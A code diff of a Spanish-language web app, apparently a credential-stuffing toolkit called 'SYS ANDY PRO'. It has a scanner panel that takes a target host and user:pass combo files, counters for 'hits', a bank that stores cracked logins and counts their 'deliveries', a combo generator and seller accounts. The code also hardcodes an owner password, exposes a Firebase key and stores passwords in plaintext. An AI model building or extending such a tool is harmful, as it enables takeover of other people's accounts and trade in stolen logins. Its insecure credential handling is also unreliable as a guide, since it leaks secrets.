@@ -264,7 +264,7 @@
         <div id="sub-dedupe" class="sub-panel"><div class="form-group"><label>Archivo:</label><input type="file" id="dedupeFile"></div><div class="form-group"><label>o pega texto:</label><textarea id="dedupeText" rows="4"></textarea></div><button class="btn-block btn-start" onclick="eliminarDuplicados()">ELIMINAR DUPLICADOS</button><textarea id="dedupeResultado" rows="8" readonly></textarea><button id="btnDescargarDedupe" class="btn-block btn-save" disabled onclick="descargarDedupeResultado()">DESCARGAR</button></div>
     </div>
 
-    <!-- ========== NUEVO ESCÁNER (reemplazado completamente) ========== -->
+    <!-- ========== NUEVO ESCÁNER ========== -->
     <div id="panel-scanner" class="panel">
         <div class="form-group"><label id="lblHost">Panel (host con o sin http/https):</label><input type="text" id="hostInput" placeholder="ej: lista.com:8080" autocomplete="off" /></div>
         <div class="form-group"><label id="lblCombo">Elige archivos .txt con combos (user:pass):</label>
@@ -283,21 +283,18 @@
         <button id="stopBtn" class="btn-block btn-stop" disabled>DETENER SCAN</button>
         <button id="saveBtn" class="btn-block btn-save" disabled>GUARDAR EN TELÉFONO (.TXT)</button>
 
-        <!-- Barra progreso Job 1 -->
         <div id="progressContainer" class="progressContainer">
             <div class="jobTop"><div id="hitsCount1" class="hitsCount">Hits: 0</div></div>
             <div class="progressBar"><div id="progressBarFill" class="progressBarFill"></div></div>
             <div id="progressText" class="progressText">Esperando inicio...</div>
             <div id="currentCombo" class="currentCombo">Usuario actual: -</div>
         </div>
-        <!-- Barra progreso Job 2 -->
         <div id="progressContainer2" class="progressContainer">
             <div class="jobTop"><div id="hitsCount2" class="hitsCount">Hits: 0</div></div>
             <div class="progressBar"><div id="progressBarFill2" class="progressBarFill"></div></div>
             <div id="progressText2" class="progressText">Esperando inicio...</div>
             <div id="currentCombo2" class="currentCombo">Usuario actual: -</div>
         </div>
-        <!-- Barra progreso Job 3 -->
         <div id="progressContainer3" class="progressContainer">
             <div class="jobTop"><div id="hitsCount3" class="hitsCount">Hits: 0</div></div>
             <div class="progressBar"><div id="progressBarFill3" class="progressBarFill"></div></div>
@@ -337,7 +334,7 @@
 </div>
 
 <script>
-    // ========== CONFIGURACIÓN GLOBAL (Firebase, etc.) ==========
+    // ========== CONFIGURACIÓN GLOBAL ==========
     const firebaseConfig = {
         apiKey: "AIzaSyDGE5GTlwIypuryIVnDYiTR9a2wyCgWkfs",
         authDomain: "gestion-ventas-pro-f8de4.firebaseapp.com",
@@ -351,7 +348,6 @@
     const db = firebase.database();
 
     let currentUser = null, usernameClave = "";
-    // Variables del nuevo escáner (se declaran más adelante)
     let stopRequested = false;
     let isRunning = false;
     let combos1 = [], combos2 = [], combos3 = [], combosTxt = [];
@@ -365,52 +361,257 @@
 
     function limpiarClaveLocal(str){ return str.toLowerCase().trim().replace(/[\.\$\#\[\]\@]/g, "_"); }
 
-    // ========== LOGIN / REGISTRO / ADMIN ==========
+    // ========== LOGIN / REGISTRO / ADMIN (exactamente como antes) ==========
     document.querySelectorAll('.auth-tab').forEach(t=>t.addEventListener('click',function(){let target=this.getAttribute('data-auth');document.querySelectorAll('.auth-tab').forEach(t=>t.classList.remove('active'));this.classList.add('active');document.querySelectorAll('.auth-panel').forEach(p=>p.classList.remove('active'));document.getElementById(`auth-${target}`).classList.add('active');}));
-    function procesarLogin(){let email=document.getElementById('loginEmail').value.trim().toLowerCase(),pass=document.getElementById('loginPass').value.trim();if(!email||!pass){alert("Complete");return;}if((email==="andy"||email==="andyobregon799@gmail.com")&&pass==="andy799"){ingresarAlSistema(email,"Owner");return;}let nodo=limpiarClaveLocal(email);db.ref("vendedores/"+nodo).once("value").then(snap=>{if(snap.exists()&&snap.val().pass===pass)ingresarAlSistema(snap.val().email,"Seller");else alert("Credencial incorrecta");});}
-    async function ingresarAlSistema(email,rol){currentUser={email,role:rol,uid:limpiarClaveLocal(email)};usernameClave=currentUser.uid;document.getElementById('auth-screen').style.display='none';document.getElementById('main-app').style.display='block';document.getElementById('userDisplay').textContent=`Activo: ${email} (${rol})`;if(rol==="Owner"){document.getElementById('tabAdminBtn').style.display='block';document.getElementById('tabSolicitudesBtn').style.display='block';escucharVendedores();escucharSolicitudesRegistro();}else{document.getElementById('tabAdminBtn').style.display='none';document.getElementById('tabSolicitudesBtn').style.display='none';}if(!localStorage.getItem('sys_urls'))localStorage.setItem('sys_urls',JSON.stringify({}));if(!localStorage.getItem('sys_saved_hits'))localStorage.setItem('sys_saved_hits',JSON.stringify({}));renderizarUrlsBloc();renderizarBancoHits();switchTab('combos');await cargarPerfilUsuario(email);iniciarChat();}
-    function cerrarSesion(){if(window.chatUnsubscribe)window.chatUnsubscribe();if(window.solicitudesUnsubscribe)window.solicitudesUnsubscribe();currentUser=null;document.getElementById('loginEmail').value='';document.getElementById('loginPass').value='';document.getElementById('auth-screen').style.display='flex';document.getElementById('main-app').style.display='none';}
-    function crearVendedorFirebase(){let email=document.getElementById("newAdminEmail").value.trim(),pass=document.getElementById("newAdminPass").value.trim();if(!email||!pass){alert("Complete");return;}db.ref("vendedores/"+limpiarClaveLocal(email)).set({email,pass,fechaCreado:firebase.database.ServerValue.TIMESTAMP},()=>{alert("Registrado");document.getElementById("newAdminEmail").value="";document.getElementById("newAdminPass").value="";});}
-    function escucharVendedores(){db.ref("vendedores").on("value",(snap)=>{let cont=document.getElementById("listaVendedoresContainer");if(!cont)return;cont.innerHTML="";snap.forEach(h=>{let d=h.val();let div=document.createElement("div");div.className="item-card";div.innerHTML=`<div>👤 ${d.email} 🔑 ${d.pass}</div><div class="item-actions"><button class="btn-small btn-del" onclick="eliminarVendedorFirebase('${h.key}')">Eliminar</button></div>`;cont.appendChild(div);});});}
-    function eliminarVendedorFirebase(key){if(confirm("Eliminar?"))db.ref("vendedores/"+key).remove();}
-    function solicitarRegistro(){let email=document.getElementById('regEmail').value.trim().toLowerCase(),pass=document.getElementById('regPass').value.trim(),passC=document.getElementById('regPassConfirm').value.trim(),display=document.getElementById('regDisplayName').value.trim()||email.split('@')[0];if(!email||!pass||!passC){alert("Complete");return;}if(pass!==passC){alert("No coinciden");return;}if(pass.length<4){alert("Mínimo 4");return;}let nodo=limpiarClaveLocal(email);db.ref(`vendedores/${nodo}`).once('value').then(snap=>{if(snap.exists()){alert("Ya registrado");return;}db.ref('registro_solicitudes').orderByChild('email').equalTo(email).once('value').then(snapS=>{let pend=false;snapS.forEach(c=>{if(c.val().estado==='pendiente')pend=true;});if(pend){alert("Ya tienes solicitud");return;}db.ref('registro_solicitudes').push({email,password:pass,displayName:display,estado:'pendiente',fecha:firebase.database.ServerValue.TIMESTAMP}).then(()=>{alert("Solicitud enviada");document.getElementById('regEmail').value='';document.getElementById('regPass').value='';document.getElementById('regPassConfirm').value='';document.getElementById('regDisplayName').value='';document.querySelector('.auth-tab[data-auth="login"]').click();});});});}
-    let solicitudesUnsubscribe=null;
-    function escucharSolicitudesRegistro(){if(solicitudesUnsubscribe)solicitudesUnsubscribe();let ref=db.ref('registro_solicitudes').orderByChild('estado').equalTo('pendiente');solicitudesUnsubscribe=ref.on('value',(snap)=>{let cont=document.getElementById('solicitudesContainer'),tabBtn=document.getElementById('tabSolicitudesBtn');if(!cont)return;cont.innerHTML='';let count=0;if(snap.exists()){snap.forEach(c=>{count++;let s=c.val();let fecha=s.fecha?new Date(s.fecha).toLocaleString():'desconocida';let div=document.createElement('div');div.className='item-card';div.innerHTML=`<div><strong>📧 ${s.email}</strong> | 🧑 ${s.displayName}</div><div>📅 ${fecha}</div><div class="item-actions"><button class="btn-small btn-approve" onclick="aprobarSolicitud('${c.key}','${s.email.replace(/'/g,"\\'")}','${s.password.replace(/'/g,"\\'")}','${s.displayName.replace(/'/g,"\\'")}')">✅ Aprobar</button><button class="btn-small btn-reject" onclick="rechazarSolicitud('${c.key}')">❌ Rechazar</button></div>`;cont.appendChild(div);});}else cont.innerHTML='<p>Sin solicitudes</p>';if(tabBtn){let badge=tabBtn.querySelector('.badge-pending');if(count>0){if(!badge)tabBtn.innerHTML=`📝 SOLICITUDES <span class="badge-pending">${count}</span>`;else badge.textContent=count;}else{if(badge)badge.remove();if(tabBtn.innerText.includes('('))tabBtn.innerHTML='📝 SOLICITUDES';}}});}
-    async function aprobarSolicitud(key,email,password,displayName){if(!confirm(`Aprobar a ${email}?`))return;let nodo=limpiarClaveLocal(email);try{await db.ref(`vendedores/${nodo}`).set({email,pass:password,fechaCreado:firebase.database.ServerValue.TIMESTAMP});await db.ref(`chat_profiles/${nodo}`).set({name:displayName||email.split('@')[0],avatar:'🦁'});await db.ref(`registro_solicitudes/${key}`).remove();alert(`✅ ${email} aprobado`);}catch(e){alert(e.message);}}
-    async function rechazarSolicitud(key){if(confirm("Rechazar?"))await db.ref(`registro_solicitudes/${key}`).remove();}
+    
+    function procesarLogin(){
+        let email = document.getElementById('loginEmail').value.trim().toLowerCase();
+        let pass = document.getElementById('loginPass').value.trim();
+        if(!email || !pass){ alert("Completa todos los campos."); return; }
+        // Dueño
+        if((email === "andy" || email === "andyobregon799@gmail.com") && pass === "andy799"){
+            ingresarAlSistema(email, "Owner");
+            return;
+        }
+        const nodo = limpiarClaveLocal(email);
+        console.log("Buscando vendedor:", nodo); // Depuración
+        db.ref("vendedores/" + nodo).once("value").then((snapshot) => {
+            if(snapshot.exists() && snapshot.val().pass === pass) {
+                ingresarAlSistema(snapshot.val().email, "Seller");
+            } else {
+                alert("Credencial incorrecta o aún no aprobada.");
+            }
+        }).catch(err => { console.error(err); alert("Error de conexión."); });
+    }
+
+    async function ingresarAlSistema(email,rol){
+        currentUser = { email, role: rol, uid: limpiarClaveLocal(email) };
+        usernameClave = currentUser.uid;
+        document.getElementById('auth-screen').style.display = 'none';
+        document.getElementById('main-app').style.display = 'block';
+        document.getElementById('userDisplay').textContent = `Activo: ${email} (${rol})`;
+        if(rol === "Owner"){
+            document.getElementById('tabAdminBtn').style.display = 'block';
+            document.getElementById('tabSolicitudesBtn').style.display = 'block';
+            escucharVendedores();
+            escucharSolicitudesRegistro();
+        } else {
+            document.getElementById('tabAdminBtn').style.display = 'none';
+            document.getElementById('tabSolicitudesBtn').style.display = 'none';
+        }
+        if(!localStorage.getItem('sys_urls')) localStorage.setItem('sys_urls', JSON.stringify({}));
+        if(!localStorage.getItem('sys_saved_hits')) localStorage.setItem('sys_saved_hits', JSON.stringify({}));
+        renderizarUrlsBloc();
+        renderizarBancoHits();
+        switchTab('combos');
+        await cargarPerfilUsuario(email);
+        iniciarChat();
+    }
+
+    function cerrarSesion(){
+        if(window.chatUnsubscribe) window.chatUnsubscribe();
+        if(window.solicitudesUnsubscribe) window.solicitudesUnsubscribe();
+        currentUser = null;
+        document.getElementById('loginEmail').value = '';
+        document.getElementById('loginPass').value = '';
+        document.getElementById('auth-screen').style.display = 'flex';
+        document.getElementById('main-app').style.display = 'none';
+    }
+
+    function crearVendedorFirebase(){
+        let email = document.getElementById("newAdminEmail").value.trim();
+        let pass = document.getElementById("newAdminPass").value.trim();
+        if(!email || !pass){ alert("Completa ambos campos."); return; }
+        const nodo = limpiarClaveLocal(email);
+        db.ref("vendedores/" + nodo).set({ email, pass, fechaCreado: firebase.database.ServerValue.TIMESTAMP }, () => {
+            alert("Registrado con éxito");
+            document.getElementById("newAdminEmail").value = "";
+            document.getElementById("newAdminPass").value = "";
+        });
+    }
+
+    function escucharVendedores(){
+        db.ref("vendedores").on("value", (snap) => {
+            const container = document.getElementById("listaVendedoresContainer");
+            if(!container) return;
+            container.innerHTML = "";
+            if(!snap.exists()) { container.innerHTML = `<p>No hay vendedores.</p>`; return; }
+            snap.forEach((hijo) => {
+                const d = hijo.val();
+                const div = document.createElement("div");
+                div.className = "item-card";
+                div.innerHTML = `<div>👤 <strong>${d.email}</strong> 🔑 ${d.pass}</div><div class="item-actions"><button class="btn-small btn-del" onclick="eliminarVendedorFirebase('${hijo.key}')">Eliminar</button></div>`;
+                container.appendChild(div);
+            });
+        });
+    }
+    function eliminarVendedorFirebase(key){ if(confirm("¿Eliminar acceso?")) db.ref("vendedores/" + key).remove(); }
+
+    function solicitarRegistro(){
+        const email = document.getElementById('regEmail').value.trim().toLowerCase();
+        const pass = document.getElementById('regPass').value.trim();
+        const passC = document.getElementById('regPassConfirm').value.trim();
+        const display = document.getElementById('regDisplayName').value.trim() || email.split('@')[0];
+        if(!email || !pass || !passC){ alert("Completa todos los campos."); return; }
+        if(pass !== passC){ alert("Las contraseñas no coinciden."); return; }
+        if(pass.length < 4){ alert("La contraseña debe tener al menos 4 caracteres."); return; }
+        const nodo = limpiarClaveLocal(email);
+        db.ref(`vendedores/${nodo}`).once('value').then(snap => {
+            if(snap.exists()){ alert("Este correo ya está registrado. Inicia sesión."); return; }
+            db.ref('registro_solicitudes').orderByChild('email').equalTo(email).once('value').then(snapS => {
+                let pend = false;
+                snapS.forEach(c => { if(c.val().estado === 'pendiente') pend = true; });
+                if(pend){ alert("Ya tienes una solicitud pendiente."); return; }
+                db.ref('registro_solicitudes').push({
+                    email, password: pass, displayName: display, estado: 'pendiente',
+                    fecha: firebase.database.ServerValue.TIMESTAMP
+                }).then(() => {
+                    alert("✅ Solicitud enviada. El administrador la revisará.");
+                    document.getElementById('regEmail').value = '';
+                    document.getElementById('regPass').value = '';
+                    document.getElementById('regPassConfirm').value = '';
+                    document.getElementById('regDisplayName').value = '';
+                    document.querySelector('.auth-tab[data-auth="login"]').click();
+                }).catch(err => alert("Error: " + err.message));
+            });
+        });
+    }
+
+    let solicitudesUnsubscribe = null;
+    function escucharSolicitudesRegistro(){
+        if(solicitudesUnsubscribe) solicitudesUnsubscribe();
+        const ref = db.ref('registro_solicitudes').orderByChild('estado').equalTo('pendiente');
+        solicitudesUnsubscribe = ref.on('value', (snap) => {
+            const container = document.getElementById('solicitudesContainer');
+            const tabBtn = document.getElementById('tabSolicitudesBtn');
+            if(!container) return;
+            container.innerHTML = '';
+            let count = 0;
+            if(snap.exists()){
+                snap.forEach(c => {
+                    count++;
+                    const s = c.val();
+                    const fecha = s.fecha ? new Date(s.fecha).toLocaleString() : 'desconocida';
+                    const div = document.createElement('div');
+                    div.className = 'item-card';
+                    div.innerHTML = `
+                        <div><strong>📧 ${s.email}</strong> | 🧑 ${s.displayName}</div>
+                        <div>📅 ${fecha}</div>
+                        <div class="item-actions">
+                            <button class="btn-small btn-approve" onclick="aprobarSolicitud('${c.key}','${s.email.replace(/'/g, "\\'")}','${s.password.replace(/'/g, "\\'")}','${s.displayName.replace(/'/g, "\\'")}')">✅ Aprobar</button>
+                            <button class="btn-small btn-reject" onclick="rechazarSolicitud('${c.key}')">❌ Rechazar</button>
+                        </div>
+                    `;
+                    container.appendChild(div);
+                });
+            } else {
+                container.innerHTML = '<p>✨ No hay solicitudes pendientes.</p>';
+            }
+            if(tabBtn){
+                let badge = tabBtn.querySelector('.badge-pending');
+                if(count > 0){
+                    if(!badge) tabBtn.innerHTML = `📝 SOLICITUDES <span class="badge-pending">${count}</span>`;
+                    else badge.textContent = count;
+                } else {
+                    if(badge) badge.remove();
+                    if(tabBtn.innerText.includes('(')) tabBtn.innerHTML = '📝 SOLICITUDES';
+                }
+            }
+        });
+    }
+
+    async function aprobarSolicitud(key, email, password, displayName){
+        if(!confirm(`Aprobar a ${email}? Se creará como vendedor.`)) return;
+        const nodo = limpiarClaveLocal(email);
+        try {
+            await db.ref(`vendedores/${nodo}`).set({ email, pass: password, fechaCreado: firebase.database.ServerValue.TIMESTAMP });
+            await db.ref(`chat_profiles/${nodo}`).set({ name: displayName || email.split('@')[0], avatar: '🦁' });
+            await db.ref(`registro_solicitudes/${key}`).remove();
+            alert(`✅ ${email} aprobado. Ya puede iniciar sesión.`);
+        } catch(e) { alert("Error: "+e.message); }
+    }
+    async function rechazarSolicitud(key){ if(confirm("¿Rechazar solicitud?")) await db.ref(`registro_solicitudes/${key}`).remove(); }
 
     // ========== RECUPERACIÓN ==========
-    const resetModal=document.getElementById('resetModal'),closeModal=document.querySelector('.close-modal'),forgotLink=document.getElementById('forgotPasswordLink');let resetEmailTemp="";
-    forgotLink.onclick=e=>{e.preventDefault();resetModal.style.display='flex';document.getElementById('resetStep1').style.display='block';document.getElementById('resetStep2').style.display='none';document.getElementById('resetMsg').innerHTML='';document.getElementById('resetEmail').value='';document.getElementById('resetCode').value='';document.getElementById('newPassword').value='';document.getElementById('confirmNewPassword').value='';};
-    closeModal.onclick=()=>resetModal.style.display='none';window.onclick=e=>{if(e.target===resetModal)resetModal.style.display='none';};
-    function generarCodigo(){return Math.floor(100000+Math.random()*900000).toString();}
-    async function solicitarCodigoReset(){let email=document.getElementById('resetEmail').value.trim().toLowerCase();if(!email){alert("Ingresa correo");return;}let nodo=limpiarClaveLocal(email);let snap=await db.ref(`vendedores/${nodo}`).once('value');if(!snap.exists()){alert("No existe cuenta");return;}let code=generarCodigo();let expiresAt=Date.now()+5*60*1000;await db.ref(`reset_codes/${nodo}`).set({code,expiresAt,email});resetEmailTemp=email;if(EMAILJS_PUBLIC_KEY!=="TU_PUBLIC_KEY_AQUI"&&EMAILJS_SERVICE_ID!=="TU_SERVICE_ID_AQUI"&&EMAILJS_TEMPLATE_ID!=="TU_TEMPLATE_ID_AQUI"){try{await emailjs.send(EMAILJS_SERVICE_ID,EMAILJS_TEMPLATE_ID,{to_email:email,code:code,subject:"Código recuperación"});document.getElementById('resetMsg').innerHTML='<span style="color:#00cc66;">✅ Código enviado</span>';document.getElementById('resetStep1').style.display='none';document.getElementById('resetStep2').style.display='block';}catch(err){document.getElementById('resetMsg').innerHTML='<span style="color:#ff6666;">Error EmailJS</span>';}}else{console.warn("Código:",code);alert(`[DEMO] Código: ${code}`);document.getElementById('resetMsg').innerHTML='<span>⚠️ Modo demo</span>';document.getElementById('resetStep1').style.display='none';document.getElementById('resetStep2').style.display='block';}}
-    async function verificarCodigoYResetear(){let code=document.getElementById('resetCode').value.trim(),newPass=document.getElementById('newPassword').value.trim(),confirmPass=document.getElementById('confirmNewPassword').value.trim();if(!code||!newPass||!confirmPass){alert("Complete");return;}if(newPass.length<4){alert("Mínimo 4");return;}if(newPass!==confirmPass){alert("No coinciden");return;}let email=resetEmailTemp;if(!email){alert("Reinicia proceso");resetModal.style.display='none';return;}let nodo=limpiarClaveLocal(email);let snap=await db.ref(`reset_codes/${nodo}`).once('value');if(!snap.exists()){alert("Código inválido");return;}let data=snap.val();if(Date.now()>data.expiresAt){alert("Expirado");await db.ref(`reset_codes/${nodo}`).remove();return;}if(data.code!==code){alert("Código incorrecto");return;}await db.ref(`vendedores/${nodo}`).update({pass:newPass});await db.ref(`reset_codes/${nodo}`).remove();alert("Contraseña restablecida");resetModal.style.display='none';document.getElementById('loginEmail').value=email;}
+    const resetModal = document.getElementById('resetModal'), closeModal = document.querySelector('.close-modal'), forgotLink = document.getElementById('forgotPasswordLink');
+    let resetEmailTemp = "";
+    forgotLink.onclick = e => { e.preventDefault(); resetModal.style.display = 'flex'; document.getElementById('resetStep1').style.display = 'block'; document.getElementById('resetStep2').style.display = 'none'; document.getElementById('resetMsg').innerHTML = ''; document.getElementById('resetEmail').value = ''; document.getElementById('resetCode').value = ''; document.getElementById('newPassword').value = ''; document.getElementById('confirmNewPassword').value = ''; };
+    closeModal.onclick = () => resetModal.style.display = 'none'; window.onclick = e => { if(e.target === resetModal) resetModal.style.display = 'none'; };
+    function generarCodigo(){ return Math.floor(100000 + Math.random() * 900000).toString(); }
+    async function solicitarCodigoReset(){
+        const email = document.getElementById('resetEmail').value.trim().toLowerCase();
+        if(!email){ alert("Ingresa tu correo electrónico."); return; }
+        const nodo = limpiarClaveLocal(email);
+        const snap = await db.ref(`vendedores/${nodo}`).once('value');
+        if(!snap.exists()){ alert("No hay una cuenta registrada con ese correo."); return; }
+        const code = generarCodigo();
+        const expiresAt = Date.now() + 5 * 60 * 1000;
+        await db.ref(`reset_codes/${nodo}`).set({ code, expiresAt, email });
+        resetEmailTemp = email;
+        if(EMAILJS_PUBLIC_KEY !== "TU_PUBLIC_KEY_AQUI" && EMAILJS_SERVICE_ID !== "TU_SERVICE_ID_AQUI" && EMAILJS_TEMPLATE_ID !== "TU_TEMPLATE_ID_AQUI"){
+            try {
+                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, { to_email: email, code: code, subject: "Código de recuperación - SYS ANDY PRO" });
+                document.getElementById('resetMsg').innerHTML = '<span style="color:#00cc66;">✅ Código enviado a tu correo.</span>';
+                document.getElementById('resetStep1').style.display = 'none';
+                document.getElementById('resetStep2').style.display = 'block';
+            } catch(err) {
+                document.getElementById('resetMsg').innerHTML = '<span style="color:#ff6666;">❌ Error al enviar el correo.</span>';
+            }
+        } else {
+            console.warn("Código generado:", code);
+            alert(`[DEMO] Código de verificación: ${code}\n(Revisa la consola. Configura EmailJS para envío real.)`);
+            document.getElementById('resetMsg').innerHTML = '<span style="color:#ffaa44;">⚠️ Modo demostración: revisa la consola.</span>';
+            document.getElementById('resetStep1').style.display = 'none';
+            document.getElementById('resetStep2').style.display = 'block';
+        }
+    }
+    async function verificarCodigoYResetear(){
+        const code = document.getElementById('resetCode').value.trim();
+        const newPass = document.getElementById('newPassword').value.trim();
+        const confirmPass = document.getElementById('confirmNewPassword').value.trim();
+        if(!code || !newPass || !confirmPass){ alert("Completa todos los campos."); return; }
+        if(newPass.length < 4){ alert("La nueva contraseña debe tener al menos 4 caracteres."); return; }
+        if(newPass !== confirmPass){ alert("Las contraseñas nuevas no coinciden."); return; }
+        const email = resetEmailTemp;
+        if(!email){ alert("Correo no identificado. Reinicia el proceso."); resetModal.style.display = 'none'; return; }
+        const nodo = limpiarClaveLocal(email);
+        const snap = await db.ref(`reset_codes/${nodo}`).once('value');
+        if(!snap.exists()){ alert("Código no válido o expirado. Solicita uno nuevo."); return; }
+        const data = snap.val();
+        if(Date.now() > data.expiresAt){ alert("El código ha expirado."); await db.ref(`reset_codes/${nodo}`).remove(); return; }
+        if(data.code !== code){ alert("Código incorrecto."); return; }
+        await db.ref(`vendedores/${nodo}`).update({ pass: newPass });
+        await db.ref(`reset_codes/${nodo}`).remove();
+        alert("✅ Contraseña restablecida correctamente.");
+        resetModal.style.display = 'none';
+        document.getElementById('loginEmail').value = email;
+    }
 
     // ========== BLOC URLS ==========
-    function guardarUrlBloc(){let val=document.getElementById('inputUrlData').value.trim(),editId=document.getElementById('editUrlId').value;if(!val)return;let base=JSON.parse(localStorage.getItem('sys_urls'))||{};if(!base[usernameClave])base[usernameClave]=[];if(editId!==""){base[usernameClave][parseInt(editId)]=val;document.getElementById('editUrlId').value="";}else base[usernameClave].push(val);localStorage.setItem('sys_urls',JSON.stringify(base));document.getElementById('inputUrlData').value="";renderizarUrlsBloc();}
-    function renderizarUrlsBloc(){let base=JSON.parse(localStorage.getItem('sys_urls'))||{},cont=document.getElementById('listaUrlsContainer');cont.innerHTML='';let mis=base[usernameClave]||[];if(mis.length===0){cont.innerHTML='<p>No hay URLs</p>';return;}mis.forEach((url,idx)=>{let div=document.createElement('div');div.className='item-card';div.innerHTML=`<div>🌐 ${url}</div><div class="item-actions"><button class="btn-small btn-copy" onclick="usarUrlEscanner(${idx})">🔌 Escanear</button><button class="btn-small btn-del" onclick="eliminarUrl(${idx})">Eliminar</button></div>`;cont.appendChild(div);});}
-    function usarUrlEscanner(idx){let base=JSON.parse(localStorage.getItem('sys_urls'));document.getElementById('hostInput').value=base[usernameClave][idx].split(" - ")[0].trim();switchTab('scanner');}
-    function eliminarUrl(idx){let base=JSON.parse(localStorage.getItem('sys_urls'));base[usernameClave].splice(idx,1);localStorage.setItem('sys_urls',JSON.stringify(base));renderizarUrlsBloc();}
+    function guardarUrlBloc(){ let val = document.getElementById('inputUrlData').value.trim(), editId = document.getElementById('editUrlId').value; if(!val) return; let base = JSON.parse(localStorage.getItem('sys_urls')) || {}; if(!base[usernameClave]) base[usernameClave] = []; if(editId !== ""){ base[usernameClave][parseInt(editId)] = val; document.getElementById('editUrlId').value = ""; } else base[usernameClave].push(val); localStorage.setItem('sys_urls', JSON.stringify(base)); document.getElementById('inputUrlData').value = ""; renderizarUrlsBloc(); }
+    function renderizarUrlsBloc(){ let base = JSON.parse(localStorage.getItem('sys_urls')) || {}, cont = document.getElementById('listaUrlsContainer'); cont.innerHTML = ''; let mis = base[usernameClave] || []; if(mis.length === 0){ cont.innerHTML = '<p>No hay servidores guardados.</p>'; return; } mis.forEach((url, idx) => { let div = document.createElement('div'); div.className = 'item-card'; div.innerHTML = `<div>🌐 <code>${url}</code></div><div class="item-actions"><button class="btn-small btn-copy" onclick="usarUrlEscanner(${idx})">🔌 Escanear</button><button class="btn-small btn-del" onclick="eliminarUrl(${idx})">Eliminar</button></div>`; cont.appendChild(div); }); }
+    function usarUrlEscanner(idx){ let base = JSON.parse(localStorage.getItem('sys_urls')); document.getElementById('hostInput').value = base[usernameClave][idx].split(" - ")[0].trim(); switchTab('scanner'); }
+    function eliminarUrl(idx){ let base = JSON.parse(localStorage.getItem('sys_urls')); base[usernameClave].splice(idx, 1); localStorage.setItem('sys_urls', JSON.stringify(base)); renderizarUrlsBloc(); }
 
     // ========== BANCO HITS ==========
-    function guardarHitEnBanco(texto,user,pass){let base=JSON.parse(localStorage.getItem('sys_saved_hits'))||{};if(!base[usernameClave])base[usernameClave]=[];if(base[usernameClave].some(h=>h.user===user&&h.pass===pass))return;let ahora=new Date();base[usernameClave].push({id:Date.now()+Math.random(),user,pass,texto,copies:0,fecha:ahora.toLocaleString(),timestamp:ahora.getTime()});localStorage.setItem('sys_saved_hits',JSON.stringify(base));renderizarBancoHits();}
-    function renderizarBancoHits(){let base=JSON.parse(localStorage.getItem('sys_saved_hits'))||{},cont=document.getElementById('bancoHitsContainer');cont.innerHTML='';let mis=base[usernameClave]||[];if(mis.length===0){cont.innerHTML='<p>Sin hits</p>';return;}mis.sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));mis.forEach(h=>{let div=document.createElement('div');div.className='hit-block';div.innerHTML=`<div class="hit-header"><span>👤 ${h.user}</span><span class="counter-badge">Copias: ${h.copies||0}</span></div><div class="hit-date">📅 ${h.fecha}</div><pre class="hit-content">${h.texto}</pre><div class="item-actions"><button class="btn-small btn-copy" onclick="copiarHitConContador(${h.id})">📋 Copiar</button><button class="btn-small btn-del" onclick="borrarHitBanco(${h.id})">Eliminar</button></div>`;cont.appendChild(div);});}
-    function copiarHitConContador(id){let base=JSON.parse(localStorage.getItem('sys_saved_hits'));let item=base[usernameClave].find(h=>h.id==id);if(item){item.copies=(item.copies||0)+1;localStorage.setItem('sys_saved_hits',JSON.stringify(base));navigator.clipboard.writeText(item.texto);renderizarBancoHits();}}
-    function borrarHitBanco(id){let base=JSON.parse(localStorage.getItem('sys_saved_hits'));base[usernameClave]=base[usernameClave].filter(h=>h.id!=id);localStorage.setItem('sys_saved_hits',JSON.stringify(base));renderizarBancoHits();}
+    function guardarHitEnBanco(texto, user, pass){ let base = JSON.parse(localStorage.getItem('sys_saved_hits')) || {}; if(!base[usernameClave]) base[usernameClave] = []; if(base[usernameClave].some(h => h.user === user && h.pass === pass)) return; const ahora = new Date(); base[usernameClave].push({ id: Date.now() + Math.random(), user, pass, texto, copies: 0, fecha: ahora.toLocaleString(), timestamp: ahora.getTime() }); localStorage.setItem('sys_saved_hits', JSON.stringify(base)); renderizarBancoHits(); }
+    function renderizarBancoHits(){ let base = JSON.parse(localStorage.getItem('sys_saved_hits')) || {}, cont = document.getElementById('bancoHitsContainer'); cont.innerHTML = ''; let mis = base[usernameClave] || []; if(mis.length === 0){ cont.innerHTML = '<p style="color:#ffaa66;">No hay hits guardados.</p>'; return; } mis.sort((a,b)=> (b.timestamp||0) - (a.timestamp||0)); mis.forEach(h => { let div = document.createElement('div'); div.className = 'hit-block'; div.innerHTML = `<div class="hit-header"><span>👤 ${h.user}</span><span class="counter-badge">Entregas: ${h.copies || 0}</span></div><div class="hit-date">📅 ${h.fecha}</div><pre class="hit-content">${h.texto}</pre><div class="item-actions"><button class="btn-small btn-copy" onclick="copiarHitConContador(${h.id})">📋 Copiar</button><button class="btn-small btn-del" onclick="borrarHitBanco(${h.id})">Eliminar</button></div>`; cont.appendChild(div); }); }
+    function copiarHitConContador(id){ let base = JSON.parse(localStorage.getItem('sys_saved_hits')); let item = base[usernameClave].find(h => h.id == id); if(item){ item.copies = (item.copies || 0) + 1; localStorage.setItem('sys_saved_hits', JSON.stringify(base)); navigator.clipboard.writeText(item.texto); renderizarBancoHits(); } }
+    function borrarHitBanco(id){ let base = JSON.parse(localStorage.getItem('sys_saved_hits')); base[usernameClave] = base[usernameClave].filter(h => h.id != id); localStorage.setItem('sys_saved_hits', JSON.stringify(base)); renderizarBancoHits(); }
 
     // ========== COMBOS ==========
-    const nombresReales=["juan","pedro","carlos","luis","andres","miguel","ana","maria","laura"];
-    function generarComboAvanzado(){let tipo=document.getElementById('genType').value;let cantidad=parseInt(document.getElementById('genCantidad').value)||100;let passLen=parseInt(document.getElementById('genPassLength').value)||8;let sep=document.getElementById('genSep').value;let combos=new Set();for(let i=0;i<cantidad*2&&combos.size<cantidad;i++){let user=nombresReales[Math.floor(Math.random()*nombresReales.length)]+Math.floor(Math.random()*1000);let pass=Math.random().toString(36).substring(2,passLen);combos.add(user+sep+pass);}document.getElementById('comboResultado').value=Array.from(combos).join("\n");document.getElementById('btnDescargarComboGen').disabled=false;}
-    function descargarComboGenerado(){let txt=document.getElementById('comboResultado').value;if(!txt)return;let blob=new Blob([txt],{type:'text/plain'});let a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='combo.txt';a.click();}
